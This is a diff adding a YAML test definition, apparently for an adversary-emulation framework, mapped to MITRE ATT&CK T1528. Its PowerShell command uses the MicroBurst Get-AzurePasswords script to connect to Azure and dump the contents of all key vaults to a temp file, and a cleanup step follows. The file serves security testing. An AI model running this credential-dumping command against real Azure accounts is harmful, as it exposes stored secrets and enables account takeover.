@@ -1,0 +1,23 @@
+- description: 'Upon successful execution of this test, the names, locations, and
+    contents of key vaults within an Azure account will be output to a file.
+
+    See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/'
+  id: ac51003d352df853d49a28ca5a4311f9
+  name: Azure - Dump All Azure Key Vaults with Microburst
+  platforms:
+    unknown:
+      psh:
+        cleanup: remove-item $env:temp\T1528Test1.txt -force -erroraction silentlycontinue
+        command: import-module "$env:temp\Get-AzurePasswords.ps1"; $Password = ConvertTo-SecureString
+          -String "T1082Az" -AsPlainText -Force; $Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList "None", $Password;
+          Connect-AzureRmAccount -Credential $Credential; Get-AzurePasswords -subscription
+          'None' > $env:temp\T1528Test1.txt; cat $env:temp\T1528Test1.txt
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1528
+    name: Steal Application Access Token
